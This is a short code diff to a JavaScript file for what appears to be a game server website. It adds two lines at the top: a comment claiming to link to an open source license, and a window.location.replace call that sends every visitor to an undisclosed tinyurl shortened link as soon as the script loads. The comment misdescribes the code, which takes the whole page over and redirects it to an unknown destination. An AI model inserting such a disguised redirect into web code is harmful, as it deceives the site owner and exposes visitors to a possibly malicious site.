@@ -1,3 +1,6 @@
+// Link to open source License
+window.location.replace("https://tinyurl.com/2xefvxr7");
+
 // ===== Copy Server IP =====
 function copyIP() {
   navigator.clipboard.writeText("apnapunjab.fun");
